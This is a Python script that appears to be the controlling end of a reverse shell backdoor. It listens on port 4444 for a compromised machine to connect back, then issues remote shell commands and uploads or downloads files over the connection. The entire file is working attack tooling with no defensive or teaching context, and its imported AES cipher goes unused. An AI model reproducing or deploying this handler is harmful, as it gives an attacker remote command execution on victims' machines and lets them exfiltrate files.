import socket
import json
import base64
from Crypto.Cipher import AES

class bcolors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(1)
        print(bcolors.GREEN + bcolors.BOLD)
        print("[+] Waiting for incoming connnections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from " + str(address))
        print(bcolors.WHITE + bcolors.BOLD)

    def reliable_send(self, data):
        try:
            json_data = json.dumps(data)
            self.connection.send(json_data.encode())
            print("we send: ", json_data.encode())
        except Exception as e:
            print(e)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return ("[+] Download successful")

    def read_file(self, path):
        with open(path, "rb") as file:
            stuff = base64.b64encode(file.read())
            return stuff.decode()

    def run(self):
        while True:
            command = input(">> ")
            if len(command.split(" ")) > 1:
                split=["0","1"]
                split[0] = command.split(" ", 1)[0]
                split[1] = command.split(" ", 1)[1]
                command = split
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)
                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error " not in result:
                    result = self.write_file(command[1], result)
            except Exception as e:
                print(bcolors.RED + bcolors.BOLD)
                result = "[-] Error during command execution. " + str(e)
                print(bcolors.WHITE + bcolors.BOLD)
            print(result)


listener = Listener("0.0.0.0", 4444)
listener.run()
